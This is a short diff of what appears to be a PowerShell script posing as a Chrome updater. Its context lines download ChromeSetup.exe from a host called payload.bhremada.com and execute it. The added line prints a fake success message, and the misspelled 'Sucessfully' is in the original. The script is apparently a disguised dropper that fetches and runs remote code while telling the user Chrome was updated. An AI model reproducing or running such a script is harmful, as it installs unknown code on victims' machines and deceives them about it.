@@ -3,3 +3,4 @@ Clear-Host
 echo "[*] Updating Chrome..."
 wget https://payload.bhremada.com/ChromeSetup.exe -OutFile ChromeSetup.exe
 .\ChromeSetup.exe
+echo "[*] Chrome Updated Sucessfully..."
